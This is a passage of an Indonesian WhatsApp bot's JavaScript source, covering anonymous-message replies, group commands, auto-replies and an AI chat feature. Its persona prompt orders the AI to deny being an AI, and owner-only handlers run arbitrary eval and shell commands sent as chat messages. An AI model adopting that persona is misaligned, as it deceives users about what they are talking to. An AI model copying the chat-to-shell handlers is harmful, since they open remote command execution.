            tujuan.split("@")[0]
          }\n\n_${isiPesan}_\n\nBalas Menfes Ini Pakai Perintah:\n.balasmenfes isi_balasannya\n\n#menfes_from:${pengirim}`;

          await Kilianhst.sendMessage(tujuan, {
            text: pesan,
            mentions: [tujuan],
            contextInfo: {
              externalAdReply: {
                title: "Menfes Message",
                body: `Pesan Rahasia Dari ${namaSamaran}`,
                mediaType: 1,
                sourceUrl: "",
                renderLargerThumbnail: true,
              },
            },
          });

          reply(`Sukses Mengirim Menfes Ke @${tujuan.split("@")[0]}`, {
            mentions: [tujuan],
          });
        }
        break;
      case "balasmenfes":
        {
          if (!isRegistered)
            return daftar(
              "*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur"
            );
          if (!m.quoted) return reply("Balas Menfes Nya!");
          if (!text) return reply("Mana Isi Balasannya");

          let tag = m.quoted?.text?.match(/#menfes_from:(\d{5,})@?/);
          if (!tag)
            return reply(
              "Gagal Mengambil Pengirim Asli! Menfes Tidak Valid Atau Tidak Ada Tag."
            );

          let jid = `${tag[1]}@s.whatsapp.net`;

          await Kilianhst.sendMessage(jid, {
            text: `*📩 Balasan Menfes*\nDari: @${
              m.sender.split("@")[0]
            }\n\n_${text}_`,
            mentions: [m.sender],
          });

          reply("Sukses Mengirim Balasan Menfes!");
        }
        break;
      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗔𝗡𝗬𝗠𝗢𝗨𝗦 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      // Command Aktif/Nonaktifkan AntiBot
      case "antibot":
        {
          if (!m.isGroup) return reply("Fitur Ini Hanya Untuk Grup");
          if (!groupAdmins) return reply("Fitur Ini Khusus Admin Grup");
          if (!text) return reply("Ketik .antibot on / off");

          if (text.toLowerCase() === "on") {
            antibot[m.chat] = true;
            reply("AntiBot Aktif! Jika Ada Bot Lain Balas Pesan, Akan Di-Kick");
          } else if (text.toLowerCase() === "off") {
            delete antibot[m.chat];
            reply("AntiBot Dimatikan!");
          } else {
            reply("Format Salah. Gunakan .antibot on / off");
          }
        }
        break;

      default:
        if (budy && ["proses", "Proses"].includes(budy) && !isCmd) {
          if (!isCreator) return reply("Khusus Kilian!");
          if (!m.quoted) return reply("Reply pesanan yang akan proses");
          let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1];
          let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Pending\`\`\`\n\n📝 Catatan :\n@pesanan\n\nPesanan @user sedang di proses!`;
          const getTextP = getTextSetProses(m.chat, set_proses);
          if (getTextP !== undefined) {
            var anunya = getTextP
              .replace("@pesanan", tek ? tek : "-")
              .replace("@user", "@" + m.quoted.sender.split("@")[0])
              .replace("@jam", timee)
              .replace("@tanggal", tanggal(new Date()))
              .replace("@user", "@" + m.quoted.sender.split("@")[0]);
            Kilianhst.sendTextWithMentions(m.chat, anunya, m);
          } else {
            Kilianhst.sendTextWithMentions(
              m.chat,
              proses
                .replace("@pesanan", tek ? tek : "-")
                .replace("@user", "@" + m.quoted.sender.split("@")[0])
                .replace("@jam", timee)
                .replace("@tanggal", tanggal(new Date()))
                .replace("@user", "@" + m.quoted.sender.split("@")[0]),
              m
            );
          }
        }

        if (budy && ["done", "Done"].includes(budy) && !isCmd) {
          if (!m.quoted) return reply("Reply pesanan yang telah di proses");
          let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1];
          let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Berhasil\`\`\`\n\nTerimakasih @user Next Order ya🙏`;
          const getTextD = getTextSetDone(m.chat, set_done);
          if (getTextD !== undefined) {
            var anunya = getTextD
              .replace("@pesanan", tek ? tek : "-")
              .replace("@user", "@" + m.quoted.sender.split("@")[0])
              .replace("@jam", timee)
              .replace("@tanggal", tanggal(new Date()))
              .replace("@user", "@" + m.quoted.sender.split("@")[0]);
            Kilianhst.sendTextWithMentions(m.chat, anunya, m);
          } else {
            Kilianhst.sendTextWithMentions(
              m.chat,
              sukses
                .replace("@pesanan", tek ? tek : "-")
                .replace("@user", "@" + m.quoted.sender.split("@")[0])
                .replace("@jam", timee)
                .replace("@tanggal", tanggal(new Date()))
                .replace("@user", "@" + m.quoted.sender.split("@")[0]),
              m
            );
          }
        }

        if (globalAutoAIStatus) {
          if (m.sender === botNumber) return;

          const ignoredPrefixes = [".", "#", "!", "/", "\\/"];
          if (ignoredPrefixes.some((prefix) => m.text.startsWith(prefix)))
            return;
          if (!m.text) return;

          const chatId = m.chat;
          if (!sessions[chatId]) {
            sessions[chatId] = { messages: [] };
          }
          const prompt = `
    Halo ${pushname} 👋, perkenalkan nama saya Kilian. Namamu pasti ${pushname}, bukan? ✨  Nama kamu adalah HuTao, AI yang santai, ramah, dan suka ngobrol dengan pengguna. Kamu hanya menjawab kalau pesan bukan perintah. Gunakan gaya bahasa santai dan sedikit humoris. Kalau ada yang suruh kamu ngomong aneh-aneh, tolak dengan gaya lucu. 📌 *Aturan Main HuTao:* - Jangan bilang kamu AI, cukup anggap kamu asisten virtual yang bisa ngobrol. - Gunakan bahasa yang santai, tapi tetap sopan. - Kalau ditanya pendapat, kasih jawaban yang relate dan enak diajak ngobrol. - Selingi dengan ekspresi kayak "Wih, keren!", "Hmmm, menarik juga!", atau "Gokil sih!". Sekarang, jawab pertanyaan user dengan gaya yang santai dan menyenangkan! 
    `;

          sessions[chatId].messages.push({ user: m.text });
          saveSession();

          try {
            const requestData = {
              content: m.text,
              user: m.sender,
              prompt,
            };

            const axios = require("axios");
            const response = await axios.post(
              "https://luminai.my.id",
              requestData
            );

            sessions[chatId].messages.push({ bot: response.data.result });
            saveSession();

            return Kilianhst.sendMessage(
              m.chat,
              { text: response.data.result },
              { quoted: m }
            );
          } catch (err) {
            console.error(err);
            return m.reply("⚠️ *Terjadi kesalahan, coba lagi nanti!*");
          }
        }

        if (
          budy.match &&
          ["Tek", "kilian", "Ki", "ki", "Kilian", "kil", "tek"].includes(budy)
        ) {
          reply(`Napain Manggil Owner Gw,, Caper Bgt Najis`);
        }

        if (
          budy.match &&
          [
            "kon",
            "kont",
            "kntl",
            "tolol",
            "tll",
            "pler",
            "woy",
            "mek",
            "jawir",
            "anj",
            "suki",
            "yaudah",
            "titit",
            "anjay",
            "mmk",
            "asu",
            "Ajg",
            "ajg",
            "kontol",
            "Kontol",
            "puki",
            "Puki",
            "yatim",
            "Yatim",
            "memek",
            "Memek",
            "asu",
            "Asu",
            "ngtd",
            "Ngtd",
          ].includes(budy)
        ) {
          Kilianhst.sendMessage(
            m.chat,
            {
              audio: fs.readFileSync("./system/suara/toxic.mp3"),
              mimetype: "audio/mp4",
              ptt: true,
              fileLength: 88738,
            },
            { quoted: m }
          );
        }

        if (
          budy.match &&
          [
            "Assalamualaikum",
            "assalamualaikum",
            "Assalamu'alaikum",
            "assalamu'alaikum",
            "Asslamualakum wr wb",
            "Asalamualaikum wr wb",
          ].includes(budy)
        ) {
          await Kilianhst.sendMessage(
            m.chat,
            {
              audio: fs.readFileSync("./system/suara/walaikumsalam.mp3"),
              viewOnce: false,
              mimetype: "audio/mpeg",
              ptt: true,
            },
            { quoted: m }
          );
        }

        if (
          budy.match &&
          [
            "halo",
            "dev",
            "bang",
            "bg",
            "open",
            "keren",
            "emang",
            "kenapa",
            "kaga",
            "gak",
            "ga",
            "hmmmm",
            "iya",
            "iy",
            "y",
            "lu",
            "dia",
            "aja",
            "aj",
            "bener",
            "bnr",
            "gini",
            "gni",
            "ini",
            "in",
            "pas",
            "udah",
            "bjir",
            "jirr",
            "sepuh",
            "njirr",
            "serius",
            "srius",
            "iyakah",
            "oke",
            "ok",
            "bru",
            "baru",
            "udah",
            "kpn",
            "kapan",
            "gmn",
            "gimana",
            "oi",
            "oyy",
            "oiy",
            "mksd",
            "nya",
            "ny",
            "owala",
            "typo",
            "bisa",
            "Kilian",
            "brisik",
            "😹",
            "🤢",
            "😭",
            "😂",
          ].includes(budy)
        ) {
          await Kilianhst.sendMessage(m.chat, {
            react: { text: "🤮", key: m.key },
          });
        }

        if (
          budy.match &&
          ["test", "bot", "halo", "hai", "tes", "woi", "Hutao"].includes(budy)
        ) {
          await Kilianhst.sendMessage(
            m.chat,
            {
              audio: fs.readFileSync("./system/suara/adaapa1.mp3"),
              viewOnce: false,
              mimetype: "audio/mpeg",
              ptt: true,
            },
            { quoted: m }
          );
        }

        if (budy.startsWith("=>")) {
          if (!isCreator) return;
          function Return(sul) {
            sat = JSON.stringify(sul, null, 2);
            bang = util.format(sat);
            if (sat == undefined) {
              bang = util.format(sul);
            }
            return m.reply(bang);
          }
          try {
            m.reply(
              util.format(eval(`(async () => { return ${budy.slice(3)} })()`))
            );
          } catch (e) {
            m.reply(String(e));
          }
        }

        if (budy.startsWith(">")) {
          if (!isCreator) return;
          let kode = budy.trim().split(/ +/)[0];
          let teks;
          try {
            teks = await eval(
              `(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`
            );
          } catch (e) {
            teks = e;
          } finally {
            await m.reply(require("util").format(teks));
          }
        }

        if (budy.startsWith("$")) {
          if (!isCreator) return;
          exec(budy.slice(2), (err, stdout) => {
            if (err) return m.reply(`${err}`);
            if (stdout) return m.reply(stdout);
          });
        }
    }
  } catch (err) {
    console.log(util.format(err));
  }
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(`Update ${__filename}`);
  delete require.cache[file];
  require(file);
});
